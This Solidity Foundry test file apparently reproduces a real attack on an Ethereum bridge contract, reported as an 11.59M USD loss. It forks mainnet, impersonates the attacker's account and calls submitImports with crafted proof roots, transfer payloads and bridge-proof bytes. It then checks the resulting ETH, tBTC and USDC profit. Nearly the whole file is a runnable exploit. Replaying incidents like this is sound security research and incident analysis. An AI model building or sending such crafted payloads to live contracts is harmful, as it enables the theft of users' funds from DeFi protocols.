// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 11.59M USD
// Attacker : 0x5abb91b9c01a5ed3ae762d32b236595b459d5777
// Attack Contract : 0x71518580f36feceffe0721f06ba4703218cd7f63
// Vulnerable Contract : 0x71518580f36feceffe0721f06ba4703218cd7f63
// Attack Tx : 0x6990f01720f57fc515d0e976a0c4f8157e0a9529194c4c15d190e98d087eb321
// Block : 25118335
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 11.59M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63;
    uint256 constant FORK_BLOCK = 25118334;
    uint256 constant TX_TIMESTAMP = 1779062123;
    uint256 constant TX_BLOCK_NUMBER = 25118335;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 2;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        _logBalances("Before exploit");
        attack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function attack() internal {
        Abi_submitImports_Param0_Field0_Field2[] memory submitImportsParam0Field0Field2 =
            new Abi_submitImports_Param0_Field0_Field2[](3);
        bytes32[] memory submitImportsParam0Field0Field2Row0Field1Field4 = new bytes32[](4);
        submitImportsParam0Field0Field2Row0Field1Field4[0] =
            bytes32(hex"ebb1cc631a6dd0c10e88de4393fe8573574b979e776eea6318cf41a7c6ca8d8e");
        submitImportsParam0Field0Field2Row0Field1Field4[1] =
            bytes32(hex"f1f8f848c560dd71380fc34a00ab661e7a753b91356d1c4656b3877bff5255e4");
        submitImportsParam0Field0Field2Row0Field1Field4[2] =
            bytes32(hex"a6993e48754abd6f4d2dd208b818a18dec47771e3151920cb3bfb5488cf3b87d");
        submitImportsParam0Field0Field2Row0Field1Field4[3] =
            bytes32(hex"181fe84a398c5f5cf083a7c92441ec034de08678a53675f32a517245536e5965");
        submitImportsParam0Field0Field2[0] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 2,
                height: 1,
                proofLength: 9,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field2Row0Field1Field4
            })
        });
        bytes32[] memory submitImportsParam0Field0Field2Row1Field1Field4 = new bytes32[](1);
        submitImportsParam0Field0Field2Row1Field1Field4[0] =
            bytes32(hex"6e45c5038342ced986452e43a80617badb98f7906e48fc839ebc000000000000");
        submitImportsParam0Field0Field2[1] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 2,
                height: 0,
                proofLength: 2,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field2Row1Field1Field4
            })
        });
        bytes32[] memory submitImportsParam0Field0Field2Row2Field1Field4 = new bytes32[](9);
        submitImportsParam0Field0Field2Row2Field1Field4[0] =
            bytes32(hex"f90c17804a390000000000000000000000000000000000000000000000000000");
        submitImportsParam0Field0Field2Row2Field1Field4[1] =
            bytes32(hex"fb9c2b9e70658b5a886b661821e3f90ef16dda8df940e2d0400c228a7b5287ff");
        submitImportsParam0Field0Field2Row2Field1Field4[2] =
            bytes32(hex"936e3cf4fc720000000000000000000000000000000000000000000000000000");
        submitImportsParam0Field0Field2Row2Field1Field4[3] =
            bytes32(hex"87634e882e06bc59986d86d2e0c38175777ea653e5424fa3d3a5ca046da588e4");
        submitImportsParam0Field0Field2Row2Field1Field4[4] =
            bytes32(hex"04ae45c0b4e1000000000000000000000e976b03a8d219000000000000000000");
        submitImportsParam0Field0Field2Row2Field1Field4[5] =
            bytes32(hex"6c2cafef2a0fb9abe5cdf497f93b8c61e54c3ed9c4135121a2766c84cb356ead");
        submitImportsParam0Field0Field2Row2Field1Field4[6] =
            bytes32(hex"36950b3220ceba000000000000000000d0665203cecf350f0000000000000000");
        submitImportsParam0Field0Field2Row2Field1Field4[7] =
            bytes32(hex"147fecfc3fd17087e46247f14d275c1c717a2ff3b8aa5411c432659391edc7d3");
        submitImportsParam0Field0Field2Row2Field1Field4[8] =
            bytes32(hex"4ca17e9cd202da0b1300000000000000021fd2082005b8f5447a0d0000000000");
        submitImportsParam0Field0Field2[2] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 3,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 3,
                height: 4071017,
                proofLength: 4071020,
                flags: 1,
                merkleBranch: submitImportsParam0Field0Field2Row2Field1Field4
            })
        });
        Abi_submitImports_Param0_Field0_Field3[] memory submitImportsParam0Field0Field3 =
            new Abi_submitImports_Param0_Field0_Field3[](2);
        bytes memory submitImportsParam0Field0Field3Row0Field2TransferPayload =
            hex"33a7f5b934fca59603d449337455e32d68b37dd8a5bc7b73d7c3c74d98e699f8010400000085202f890100000003000000000000000000000000000000861e3e000000000000000000";
        Abi_submitImports_Param0_Field0_Field3_Field3[] memory submitImportsParam0Field0Field3Row0Field3 =
            new Abi_submitImports_Param0_Field0_Field3_Field3[](1);
        bytes32[] memory submitImportsParam0Field0Field3Row0Field3Row0Field1Field4 = new bytes32[](3);
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[0] =
            bytes32(hex"e1d6e5bc258ce04b898310a3ede4518dbe08934f3feada389b5045265d453303");
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[1] =
            bytes32(hex"f1b10e17a45cf67db3c78dc66badc5509cc660b821ae11790a6888c4ebd977fa");
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[2] =
            bytes32(hex"9f7951aa385e9d4b6dc797b7aada3494b383c42544da2484b5d965d7aaac1d19");
        submitImportsParam0Field0Field3Row0Field3[0] = Abi_submitImports_Param0_Field0_Field3_Field3({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field3_Field3_Field1({
                version: 2,
                height: 0,
                proofLength: 6,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field3Row0Field3Row0Field1Field4
            })
        });
        submitImportsParam0Field0Field3[0] = Abi_submitImports_Param0_Field0_Field3({
            transferType: 1,
            flags: 0,
            transferPayload: submitImportsParam0Field0Field3Row0Field2TransferPayload,
            proofs: submitImportsParam0Field0Field3Row0Field3
        });
        bytes memory submitImportsParam0Field0Field3Row1Field2TransferPayload =
            hex"0000000000000000b01a04030001011452047d0db35c330271aae70bedce996b5239ca5ccc4c9104030c01011452047d0db35c330271aae70bedce996b5239ca5c4c75010008001af5b8015c64d39ab44c60ead8317f9f5a9b6c4c00a37ecd7f80fdbe3e5096124e7c8ca045b0b9e9e58b5595ee53ca9f3d964581454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c7520000000000000300000080f7b73180f7b73100000075";
        Abi_submitImports_Param0_Field0_Field3_Field3[] memory submitImportsParam0Field0Field3Row1Field3 =
            new Abi_submitImports_Param0_Field0_Field3_Field3[](1);
        bytes32[] memory submitImportsParam0Field0Field3Row1Field3Row0Field1Field4 = new bytes32[](2);
        submitImportsParam0Field0Field3Row1Field3Row0Field1Field4[0] =
            bytes32(hex"aaaff00a70df45727c6002e4c4dc57f0e2a1f58f0cab1a8c805a1d190c0916be");
        submitImportsParam0Field0Field3Row1Field3Row0Field1Field4[1] =
            bytes32(hex"e546fdbe2f25ec48d7b08bffc97c3d261cfaab94110f6721ddf918595ecb1148");
        submitImportsParam0Field0Field3Row1Field3[0] = Abi_submitImports_Param0_Field0_Field3_Field3({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field3_Field3_Field1({
                version: 2,
                height: 4,
                proofLength: 6,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field3Row1Field3Row0Field1Field4
            })
        });
        submitImportsParam0Field0Field3[1] = Abi_submitImports_Param0_Field0_Field3({
            transferType: 4,
            flags: 1,
            transferPayload: submitImportsParam0Field0Field3Row1Field2TransferPayload,
            proofs: submitImportsParam0Field0Field3Row1Field3
        });
        bytes memory submitImportsParam0Field1BridgeProof =
            hex"01454cb83913d688795e237837d30258d11ea7c75283dcbec3970901454cb83913d688795e237837d30258d11ea7c752809b20091465cb8b128bf6e690761044cceca422bb239c25f9454cb83913d688795e237837d30258d11ea7c75201f87f6d4412dad7c4452e8293850df5327f02c308a5c9bde94101454cb83913d688795e237837d30258d11ea7c752809b20091465cb8b128bf6e690761044cceca422bb239c25f9454cb83913d688795e237837d30258d11ea7c752011bd15cdbf0b5b8c9cc361ffbaf6d76cc2cdfd66782acde9980c80f01454cb83913d688795e237837d30258d11ea7c752809d54091465cb8b128bf6e690761044cceca422bb239c25f9454cb83913d688795e237837d30258d11ea7c752";
        (bool ok, bytes memory result) = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63.call{value: 0}(
            abi.encodeWithSignature(
                "submitImports(((uint8,uint8,(uint8,(uint8,uint32,uint32,uint8,bytes32[]))[],(uint8,uint8,bytes,(uint8,(uint8,uint32,uint32,uint8,bytes32[]))[])[]),bytes))",
                Abi_submitImports_Param0({
                    importBundle: Abi_submitImports_Param0_Field0({
                        version: 1,
                        network: 2,
                        proofRoots: submitImportsParam0Field0Field2,
                        transfers: submitImportsParam0Field0Field3
                    }),
                    bridgeProof: submitImportsParam0Field1BridgeProof
                })
            )
        );
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.A_65CB8B_25F9, address(0), Addresses.ZERO, "ETH", 1625366886490000000000);
        _expectProfit(Addresses.A_65CB8B_25F9, address(0), Addresses.tBTC, "tBTC", 103567660170000000000);
        _expectProfit(Addresses.A_65CB8B_25F9, address(0), Addresses.USDC, "USDC", 147658836798);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant tBTC = 0x18084fbA666a33d37592fA2633fD49a74DD93a88; // Addresses.tBTC = 0x18084fba666a33d37592fa2633fd49a74dd93a88 label=TBTC token_symbol=tBTC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x5aBb91B9c01A5Ed3aE762d32B236595B459D5777; // Addresses.attacker_eoa = 0x5abb91b9c01a5ed3ae762d32b236595b459d5777 label=attacker_eoa roles=attacker_eoa|contract|observed_address|sender source=tx_metadata.from confidence=high
    address internal constant A_65CB8B_25F9 = 0x65Cb8b128Bf6e690761044CCECA422bb239C25F9; // Addresses.A_65CB8B_25F9 = 0x65cb8b128bf6e690761044cceca422bb239c25f9 label=0x65cb8b128bf6e690761044cceca422bb239c25f9 roles=code_contract|contract|economic_holder|observed_address|profit_holder|recipient|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
}

struct Abi_submitImports_Param0_Field0_Field2_Field1 {
    uint8 version;
    uint32 height;
    uint32 proofLength;
    uint8 flags;
    bytes32[] merkleBranch;
}

struct Abi_submitImports_Param0_Field0_Field2 {
    uint8 proofType;
    Abi_submitImports_Param0_Field0_Field2_Field1 descriptor;
}

struct Abi_submitImports_Param0_Field0_Field3_Field3_Field1 {
    uint8 version;
    uint32 height;
    uint32 proofLength;
    uint8 flags;
    bytes32[] merkleBranch;
}

struct Abi_submitImports_Param0_Field0_Field3_Field3 {
    uint8 proofType;
    Abi_submitImports_Param0_Field0_Field3_Field3_Field1 descriptor;
}

struct Abi_submitImports_Param0_Field0_Field3 {
    uint8 transferType;
    uint8 flags;
    bytes transferPayload;
    Abi_submitImports_Param0_Field0_Field3_Field3[] proofs;
}

struct Abi_submitImports_Param0_Field0 {
    uint8 version;
    uint8 network;
    Abi_submitImports_Param0_Field0_Field2[] proofRoots;
    Abi_submitImports_Param0_Field0_Field3[] transfers;
}

struct Abi_submitImports_Param0 {
    Abi_submitImports_Param0_Field0 importBundle;
    bytes bridgeProof;
}

